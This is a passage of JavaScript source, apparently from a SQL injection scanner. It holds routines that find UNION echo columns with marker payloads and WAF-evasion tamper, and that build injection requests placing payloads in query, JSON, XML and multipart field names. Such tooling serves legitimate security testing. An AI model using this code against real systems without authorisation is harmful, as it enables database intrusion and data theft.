  // ⇒ `WHERE uid=testuser UNION SELECT …` 语法错误 ⇒ 200 错误页里出现 `'SQLISCANNER40'`
  // ⇒ 假命中「UNION 注入成功，回显列 40（列数 41）」。故补内容级甄别，
  // 签名复用 `core/errorSig.js` 的唯一真源（不在这里另开一份清单）。
  const errorPage = SQL_ERROR_SIG.test(body);
  return {
    body,
    status,
    errorPage,
    echoed: status != null && status >= 200 && status < 400 && !errorPage,
  };
}

// 用给定的 fromClause 做一轮完整回显列探测（text → 逐列 text → numeric A → B 交叉确认）。
// 提取为独立函数以支持「DBMS 已知时用对应 FROM 子句、未知时先空再 FROM dual 兜底」两轮复用。
/** @param {any} httpClient @param {object} ctx @param {any} columns @param {any} boundary @param {any} fromClause */
async function _probeWithFromClause(httpClient, ctx, columns, boundary, fromClause) {
  // 与 _markerProbe 同一判据：证据 payload 必须与实际发出的探测逐字节一致
  const suffix = commentSuffix(ctx.dbms, { tamperEnabled: !!ctx?.config?.wafEvasion?.tamper?.enabled });
  const textProbe = _markerProbe(ctx, columns, _textMarkers(columns), boundary, fromClause);
  const textRes = await _probeBody(httpClient, ctx, textProbe);
  unionDebug(
    `probe columns=${columns} status=${textRes.status} echoed=${textRes.echoed} ` +
      `len=${textRes.body.length} payload=${String(textProbe.payload).slice(0, 90)}`,
  );
  if (textRes.echoed) {
    const lower = textRes.body.toLowerCase();
    const cols = [];
    for (let i = 0; i < columns; i++) {
      // 大小写不敏感匹配：randomcase 等 tamper 会打乱回显标记的大小写
      if (lower.includes(`${MARKER}${i}`.toLowerCase())) cols.push(i);
    }
    if (cols.length > 0) {
      return { cols, numericCols: [], style: 'text', evidencePayload: textProbe.payload };
    }
  }

  // [CRS-FIX 2026-09-10] 全 NULL 哨兵：列数不匹配时的短路。
  // 走到这里说明「全列文本标记」探测失败，失败原因有两种，处置截然不同：
  //   ① 列数猜错（ORDER BY 二分收敛到错的 N）→ 任何 UNION 都报 "different number of
  //      columns" → 后续 N 条逐列探测 + 2 条数字族探测**必然全失败**；
  //   ② 严格类型库（PG/MSSQL/Oracle）某列为 INT，文本标记触类型错误 → 逐列探测正是为它
  //      设计的（单列标记 + 其余 NULL），必须继续。
  // 区分判据：发一条「全 NULL」UNION（不放置任何标记）。NULL 与任何列类型都兼容，
  // 故 ② 下必然成功、① 下必然失败。成本 +1 条请求，可省下 N+2 条（实测 N=50 时省 51 条）。
  // 且仅在「全列标记已失败」的分支执行，成功路径（MySQL/SQLite 一轮命中）零额外开销。
  if (!textRes.echoed) {
    const nullSentinel = _markerProbe(ctx, columns, Array.from({ length: columns }, () => 'NULL'), boundary, fromClause);
    const sentinelRes = await _probeBody(httpClient, ctx, nullSentinel);
    if (!sentinelRes.echoed) {
      unionDebug(
        `probe sentinel-fail columns=${columns} status=${sentinelRes.status} ` +
          `→ 结构性失败（列数不匹配或语法错误），跳过 ${columns} 条逐列探测 + 数字族`,
      );
      return { cols: [], numericCols: [], style: 'none', evidencePayload: textProbe.payload };
    }
  }

  // [P0-FIX 2026-09-07] 逐列文本探测：全列文本标记在严格类型库（PG/MSSQL/Oracle）上
  // 只要有一列是 INT 就整条 UNION 报错 → 真正的文本回显列（如 username/email）永远
  // 发现不了。逐列探测「单列放文本标记、其余列全 NULL」——NULL 与任何列类型 UNION
  // 都合法，因此仅当该列真正可回显文本时才命中。宽松类型库（MySQL/SQLite）第一轮
  // 已命中，不会走到这里（零额外请求）；严格类型库成本 = 列数 N 个请求（限并发 4）。
  const perCol = [];
  const BATCH = 4;
  for (let start = 0; start < columns; start += BATCH) {
    const batch = [];
    for (let i = start; i < Math.min(start + BATCH, columns); i++) {
      const nulls = Array.from({ length: columns }, () => 'NULL');
      nulls[i] = `'${MARKER}${i}'`;
      batch.push(
        _probeBody(httpClient, ctx, _markerProbe(ctx, columns, nulls, boundary, fromClause)).then((r) => ({ i, ...r }))
      );
    }
    perCol.push(...(await Promise.all(batch)));
  }
  const textCols = [];
  let evidence = textProbe.payload;
  for (const r of perCol) {
    if (r.echoed && r.body.toLowerCase().includes(`${MARKER}${r.i}`.toLowerCase())) {
      textCols.push(r.i);
      if (textCols.length === 1) {
        const single = Array.from({ length: columns }, () => 'NULL');
        single[r.i] = `'${MARKER}${r.i}'`;
        evidence =
          replaceAllLiteral(
            fillPayload('{ORIG} UNION SELECT {MARKERS}', {
              orig: `${ctx.point?.originalValue || '1'}${boundary}`,
            }),
            '{MARKERS}',
            single.join(',')
          ) + fromClause + suffix;
      }
    }
  }
  if (textCols.length > 0) {
    return { cols: textCols, numericCols: [], style: 'text', evidencePayload: evidence };
  }

  // 数字兜底 A 族
  const probeA = _markerProbe(ctx, columns, _numMarkers(NUM_MARKER_BASE_A, columns), boundary, fromClause);
  const resA = await _probeBody(httpClient, ctx, probeA);
  const hitsA = [];
  if (resA.echoed) {
    for (let i = 0; i < columns; i++) {
      if (resA.body.includes(String(NUM_MARKER_BASE_A + i))) hitsA.push(i);
    }
  }
  if (hitsA.length === 0) {
    return { cols: [], numericCols: [], style: 'none', evidencePayload: textProbe.payload };
  }

  // B 族交叉确认（仅保留双族同时命中的列，剔除页面固有数字串假命中）
  const probeB = _markerProbe(ctx, columns, _numMarkers(NUM_MARKER_BASE_B, columns), boundary, fromClause);
  const resB = await _probeBody(httpClient, ctx, probeB);
  const numericCols = resB.echoed
    ? hitsA.filter((i) => resB.body.includes(String(NUM_MARKER_BASE_B + i)))
    : [];
  if (numericCols.length === 0) {
    return { cols: [], numericCols: [], style: 'none', evidencePayload: textProbe.payload };
  }
  return { cols: [], numericCols, style: 'numeric', evidencePayload: probeA.payload };
}

// 定位可回显列（详细版）：
//   ① 全列文本标记探测（MySQL/SQLite 等宽松类型库一次请求即命中）
//   ② 落空时逐列文本探测（严格类型库：单列文本 + 其余 NULL，NULL 与任何类型 UNION 合法，
//      精确定位真正可回显文本的列——修复「任一 INT 列使全列标记整条报错 → 文本列全漏」）
//   ③ 数字标记 A 族探测 → 命中后 B 族交叉确认（纯 INT 回显列兜底）
//   ④ ★FIX [P0]：DBMS 未知时补一轮 FROM dual 兜底
//      Oracle/DM8/DB2 等方言 SELECT 必须带 FROM 伪表，否则直接报错 → 第一轮全失败。
//      FROM dual 对 MySQL/Oracle 安全（合法），PG/SQLite/MSSQL 不支持 dual → 报错 → 不误报。
// 返回 { cols: 文本回显列, numericCols: 数值回显列(已交叉确认), style, evidencePayload }
//   - cols 语义与旧版 discoverEchoColumns 一致：仅文本可回显列（拖库/版本提取只能走文本列）
//   - evidencePayload：命中的那次请求 payload（供检测器记录证据）
//   - 所有标记命中均要求响应为 2xx/3xx：5xx 错误页会回显「转换失败的输入值」，
//     按纯文本匹配会把报错回显误判为回显列（假命中）。
// [CRS-FIX 2026-09-10] boundary 缺省回落到 point.boundary。
// 原默认 '' 使**未显式传参的调用方**（DBFingerprinter 经 discoverEchoColumns）在字符串型
// 注入点上发出未闭合的 UNION 探测 → 整句落在引号内 → 恒失败 → 指纹的 UNION 版本通道
// 在 /str、/like、/blind 上 100% 空转。显式传参的 UnionDetector 本就传 point.boundary，
// 行为不变（数值型注入点 boundary 探测结果就是 ''）。
/** @param {any} httpClient @param {object} ctx @param {any} columns @param {any} boundary */
export async function discoverEchoColumnsDetailed(httpClient, ctx, columns, boundary = ctx?.point?.boundary || '') {
  if (!(columns > 0)) return { cols: [], numericCols: [], style: 'none', evidencePayload: '' };

  // 根据 DBMS 决定 UNION SELECT 的伪表 FROM 子句
  // 已知 Oracle/DM8/DB2 等 → 第一轮直接带正确 FROM 子句，一次命中
  // 未知 DBMS → 第一轮不带 FROM（MySQL/MSSQL/SQLite/PG 等不需 FROM），失败后兜底 FROM dual
  const dbms = resolveDbms(ctx.dbms);
  const fromClause = resolveFromClause(dbms, ctx?.config?.unionFrom);

  // 第一轮：用 DBMS 对应的 fromClause 探测
  const result = await _probeWithFromClause(httpClient, ctx, columns, boundary, fromClause);
  if (result.style !== 'none') return result;

  // 第二轮：DBMS 未知且第一轮全失败 → FROM dual 兜底（覆盖 Oracle/DM8/DB2 等）
  if (!dbms) {
    const dualResult = await _probeWithFromClause(httpClient, ctx, columns, boundary, ' FROM dual');
    if (dualResult.style !== 'none') return dualResult;
  }

  // 两轮都失败
  return result;
}

// 在已知列数下用标记 UNION 定位可回显列（返回 0-based 索引数组）
// 提取器/指纹器复用本函数，避免各自硬编第 2 列。语义保持向后兼容：仅返回文本可回显列。
/** @param {any} httpClient @param {object} ctx @param {any} columns */
export async function discoverEchoColumns(httpClient, ctx, columns) {
  const { cols } = await discoverEchoColumnsDetailed(httpClient, ctx, columns);
  return cols;
}

// ============================================================================
// [D93 2026-10-17] 参数名注入点的请求构造（独立于 buildInjectionRequest）
// ----------------------------------------------------------------------------
// 为什么独立成函数而不是往 buildInjectionRequest 加 else-if 分支：
// `buildInjectionRequest` 已在复杂度基线里（165 行 / 圈 91，"只许持平或变浅"），
// 加一个分支即越线；而参数名注入的语义也确实不同——它改的是**键名**、值是原样保留的，
// 与四种「值注入」位置（url/body/cookie/header）共用不了多少逻辑。独立构造函数让
// 两条路径各自可读，代价只有 Detector.buildRequest 里一次分流。
//
// 场景：后端把 query 键名拼进 SQL（`const col = Object.keys(req.query)[0];
// SELECT ... WHERE ${col} = ?`、键名当列名的 ORDER BY），值被参数化 ⇒ 值注入扫不到。
//
// ⚠ 基线语义：`value === point.originalValue` 时**必须保持原键名**（point.param），
// 否则基线请求本身就成了改键名的注入形态（`?name=name`），预筛选/门控拿它当真值基线
// ⇒ 真假对判据全歪（实测：prefilter 把该点判「无迹象」直接剪枝，检出恒 0）。
// ⚠ 编码：键名含空格/引号必须 URL 编码（Express 会 decode 回原样）；payload 已是编码形态
// （charencode 类 tamper）则不再二次编码，与 url 分支同口径。
// 诚实边界：仅 URL query 键名（carrier='query'）；JSON body 键名见 buildJsonKeyRequest
// （[D103]）；XML body 元素名见 buildXmlKeyRequest（[D105]，只承载 NameChar 合法名）。
/**
 * @param {object} target 目标（用 method / baseUrl / headerParams）
 * @param {object} point 注入点（location='paramName'，originalValue 为键名本身）
 * @param {string} value 注入值（检测器已拼好 payload）
 * @returns {{method: string, url: string, params: object, data: object, headers: object}}
 */
export function buildParamNameRequest(target, point, value) {
  const wrapped = applyPrefixSuffix(target, point, value);
  const injected = encodeForPoint(wrapped, point && point.encoding);
  const u = new URL(point.actionUrl || target.baseUrl);
  const looksEncodedName = /%[0-9A-Fa-f]{2}/.test(injected);
  const encoded = looksEncodedName ? injected : encodeURIComponent(injected);
  const keyName = injected === point.originalValue ? point.param : encoded;
  const pairs = [];
  for (const [k, v] of u.searchParams.entries()) {
    pairs.push(k === point.param ? `${keyName}=${encodeURIComponent(v)}` : `${encodeURIComponent(k)}=${encodeURIComponent(v)}`);
  }
  return {
    method: point.formMethod || target.method || 'GET',
    url: `${u.origin}${u.pathname}?${pairs.join('&')}`,
    params: {},
    data: {},
    headers: { ...(target.headerParams || {}) },
  };
}

// ============================================================================
// [D103 2026-10-18] JSON body **键名**注入点的请求构造（carrier='json'，P1-1 前半）
// ----------------------------------------------------------------------------
// 场景（D93 query 键名的结构面延伸）：后端把 JSON body 的**键名**当列名拼进 SQL
// （`const col = Object.keys(req.body)[0]; SELECT ... WHERE ${col} = ?`），值参数化 ⇒
// 值注入扫不到，只有改键名能打。JSON 键是合法字符串（可含空格/引号），布尔载荷
// `name AND 1=1-- -` 形态可直接承载——与 query 键名同型，差异只在载体。
//
// 与 buildParamNameRequest 对齐的三条语义（D93 实测教训，缺一条即静默假阴性）：
//   · 基线保值：`value === point.originalValue` 时必须保持原键名/原 body（否则基线请求
//     自身就是注入形态，门控与预筛选全歪）；
//   · 改键不改值：注入时仅替换键名，该键的**叶子值原样保留**（从 target.jsonBody 树读取）；
//   · 路径解析与 JSON 值通道同源（_splitJsonPath / _matchJsonKey：键含点号的引号段互逆）。
// 不做 URL 编码（JSON 序列化自行转义；charencode 类 tamper 对键名无意义）。
// 诚实边界：仅 JSON 对象键（数组下标不是"名字"，TargetParser 侧不生成）；路径失效时
// 原样 body（检测器自会判非注入，不抛错）。
/**
 * [D103] 沿点路径段导航到**叶子键的父对象**（路径除末段外全部走通才返回父对象，否则 null）。
 * 段为纯数字走数组下标，否则 _matchJsonKey 三向匹配（与值通道同源规则）。
 * @param {any} root 克隆体根 @param {string[]} segs _splitJsonPath 结果
 * @returns {any} 父对象或 null
 */
function _navigateJsonParent(root, segs) {
  let cur = root;
  for (let i = 0; i < segs.length - 1; i++) {
    const raw = segs[i];
    const num = /^\d+$/.test(raw) ? Number(raw) : null;
    const k = num !== null ? num : _matchJsonKey(cur, raw);
    if (k === null || cur[k] == null || typeof cur[k] !== 'object') return null;
    cur = cur[k];
  }
  return cur;
}

/**
 * [D103] 在父对象上把叶子键改名（值原样搬移）：数组父对象不可改名（下标不是"名字"），
 * 返回是否改名成功。
 * @param {any} parent @param {string} leafSeg @param {string} newKey
 * @returns {boolean}
 */
function _renameJsonLeafKey(parent, leafSeg, newKey) {
  if (Array.isArray(parent)) return false;
  const leafKey = /^\d+$/.test(leafSeg) ? null : _matchJsonKey(parent, leafSeg);
  if (leafKey === null) return false;
  const leafVal = parent[leafKey];
  delete parent[leafKey];
  parent[newKey] = leafVal;
  return true;
}

/**
 * @param {object} target 目标（用 method / baseUrl / headerParams / jsonBody）
 * @param {object} point 注入点（location='paramName'、carrier='json'，originalValue 为键名本身）
 * @param {string} value 注入值（检测器已拼好 payload）
 * @returns {{method: string, url: string, params: object, data: object, headers: object}}
 */
export function buildJsonKeyRequest(target, point, value) {
  const wrapped = applyPrefixSuffix(target, point, value);
  const method = point.formMethod || target.method || 'POST';
  const url = point.actionUrl || target.baseUrl;
  const headers = { ...(target.headerParams || {}) };
  const body = target.jsonBody != null && typeof target.jsonBody === 'object' ? target.jsonBody : {};
  const ctKey = Object.keys(headers).find((k) => /^content-type$/i.test(k));
  if (!ctKey) headers['Content-Type'] = 'application/json';
  // 基线请求：原键名、原 body 原样
  if (value === point.originalValue) {
    return { method, url, params: {}, data: JSON.stringify(body), headers };
  }
  const clone = JSON.parse(JSON.stringify(body));
  // 路径失效（非法路径/树被外部改动）：原样 body —— 至少不发坏报文
  const segs = _splitJsonPath(point.param);
  if (segs) {
    const parent = _navigateJsonParent(clone, segs);
    if (parent) _renameJsonLeafKey(parent, segs[segs.length - 1], wrapped);
  }
  return { method, url, params: {}, data: JSON.stringify(clone), headers };
}

// ============================================================================
// [D105 2026-10-18] XML body **元素名**注入点的请求构造（carrier='xml'，P1-1 余项）
// ----------------------------------------------------------------------------
// 场景：后端把 XML 元素名当列名拼 SQL（`const tag = firstChild.nodeName;
// SELECT ... WHERE ${tag} = ?`，XML-RPC / 内部网关的筛选式接口常见），值参数化 ⇒ 值注入扫不到。
//
// ⚠ 与 query/JSON 键名的本质差异：XML NameChar 不允许空格/引号/括号 ⇒ 通用布尔载荷
// （`name AND 1=1-- -`）与 UNION 载荷（含空格）**无法承载**，强发即畸形报文
// （目标解析失败后整轮判「不可注入」，比没发现更糟）。故：
//   · 本函数只忠实执行「改元素名、文本原样」；**新名必须合法**（renameXmlTag 内部
//     以 isXmlName 判定），非法名回退原报文 —— 「绝不发畸形 XML」的边界在此单点兑现。
//   · 探针族是算术位移（`tag-0` 恒等 / `tag-1` 位移），由 detectorSupport/xmlParamName.js
//     专用验证器驱动；**不套 applyPrefixSuffix/obfuscate**（闭合包裹与 tamper 都会破坏
//     NameChar 合法性——这类载荷在 XML 元素名面本来就不存在）。
//   · 基线保值：`value === point.originalValue` 时返回调用方原报文（xmlBody 原文），
//     保证基线请求与普通爬取请求逐字节一致。
/**
 * @param {object} target 目标（用 method / baseUrl / headerParams / xmlBody / xmlTree）
 * @param {object} point 注入点（location='paramName'、carrier='xml'，originalValue 为元素名）
 * @param {string} value 新元素名（验证器给的 `tag-0` / `tag-1`）
 * @returns {{method: string, url: string, params: object, data: string, headers: object}}
 */
export function buildXmlKeyRequest(target, point, value) {
  const method = point.formMethod || target.method || 'POST';
  const url = point.actionUrl || target.baseUrl;
  const headers = { ...(target.headerParams || {}) };
  const ctKey = Object.keys(headers).find((k) => /^content-type$/i.test(k));
  if (!ctKey) headers['Content-Type'] = 'application/xml';
  const rawBody = typeof target.xmlBody === 'string' ? target.xmlBody : '';
  // 基线请求：原元素名、原报文
  if (value === point.originalValue) {
    return { method, url, params: {}, data: rawBody, headers };
  }
  // 末段下标段属同名兄弟的序号而非标签本身（getXmlLeaf 同一路径规则），
  // 直接拿整条路径去改名即可——resolveNode 内部消费数字段。
  const clone = target.xmlTree ? cloneXmlTree(target.xmlTree) : null;
  let data = rawBody;
  if (clone && renameXmlTag(clone, point.param, value)) {
    data = serializeXml(clone);
  }
  // 路径失效/非法新名：原样报文 —— 至少不发坏报文（验证器会因「-0 与基线全等但 -1 也全等」
  // 自然判非注入，不会产生误报；坏报文则可能污染目标侧状态）。
  return { method, url, params: {}, data, headers };
}

// ============================================================================
// [D166 2026-10-25] multipart **字段名**注入点的请求构造（carrier='form'）
// ----------------------------------------------------------------------------
// 场景（D93 query 键名的第五个宿主）：上传+排序+筛选类表单页，后端把表单字段**名**
// 当列名拼进 SQL（`SELECT ... ORDER BY ${sort}`，值被参数化或干脆忽略）⇒ 值注入
// 扫不到，只有改字段名能打。
//
// 与 buildJsonKeyRequest 对齐的三条语义（D93 实测教训，缺一条即静默假阴性）：
//   · 基线保值：`value === point.originalValue` 时字段名/值/文件段全部原样
//     （否则基线请求自身就是注入形态，门控与预筛选全歪）；
//   · 改键不改值：注入时仅把目标字段的 name="…" 换成载荷，**该字段的值原样保留**，
//     其余文本字段与文件段（filename/contentType）原样保留；
//   · boundary 取自目标声明的 Content-Type（抓包里的 boundary 目标侧认得），
//     没声明才生成新的；CT 头随体重写为声明的 boundary（与 D159 同口径）。
//
// 载荷不套 applyPrefixSuffix 之外的任何编码：名是 Content-Disposition 属性值，
// buildMultipartBody 内部对引号/CRLF 做转义（防提前闭合属性）；charencode 类
// tamper 对属性名无意义（编码形态的名称目标侧原样读入，不会先解码）。
// 诚实边界：仅 multipart 文本字段（TargetParser._appendFormNamePoints 只建文本
// 字段点；文件字段名改名后目标多半丢弃该 part，D166 不建点）。
/**
 * @param {object} target 目标（用 method / baseUrl / headerParams / bodyParams / fileParts）
 * @param {object} point 注入点（location='paramName'、carrier='form'，originalValue 为字段名本身）
 * @param {string} value 注入值（检测器已拼好 payload）
 * @returns {{method: string, url: string, params: object, data: string, headers: object}}
 */
export function buildFormNameRequest(target, point, value) {
  const wrapped = applyPrefixSuffix(target, point, value);
  const method = point.formMethod || target.method || 'POST';
  const url = point.actionUrl || target.baseUrl;
  const headers = { ...(target.headerParams || {}) };
  const declaredCt = declaredHeaderValue(target, 'content-type');
  const existing = /boundary=(?:"([^"]+)"|([^;\s]+))/i.exec(declaredCt);
  const boundary = (existing?.[1] || existing?.[2] || `----SqlScanBoundary${nanoidLc()}`).trim();
  const fields = { ...(target.bodyParams || {}) };
  // 基线请求：原字段名、原值（与普通抓包重放语义一致）
  if (value !== point.originalValue) {
    // 改名不改值：目标字段名换成载荷，值原样；其余字段原样。
    // 按原序重建（delete+重插会把字段挪到末尾——「取第一个字段名当列名」的
    // 后端会因此读错字段，多字段表单下这是静默改变攻击面）。
    const renamed = {};
    for (const [k, v] of Object.entries(fields)) {
      renamed[k === point.param ? wrapped : k] = v;
    }
    for (const k of Object.keys(fields)) delete fields[k];
    Object.assign(fields, renamed);
  }
  const data = buildMultipartBody(fields, boundary, target && target.fileParts, null);
  headers['Content-Type'] = `multipart/form-data; boundary=${boundary}`;
  return { method, url, params: {}, data, headers };
}
